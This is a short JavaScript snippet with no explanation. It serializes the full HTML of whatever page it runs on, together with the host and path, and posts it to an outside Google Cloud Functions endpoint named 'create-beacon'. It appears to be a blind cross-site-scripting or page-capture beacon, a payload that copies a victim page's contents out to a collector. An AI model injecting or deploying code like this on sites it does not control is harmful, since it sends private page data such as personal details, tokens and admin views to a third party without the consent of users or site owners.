var source = location.host + location.pathname
var content = new XMLSerializer().serializeToString(document);

var data = JSON.stringify({ "source": source, "content": content });

var xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function () {
    if (this.readyState === 4) {
        console.log(this.responseText);
    }
});

xhr.open("POST", "https://asia-east2-linear-trees-273018.cloudfunctions.net/create-beacon");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = false;
xhr.send(data);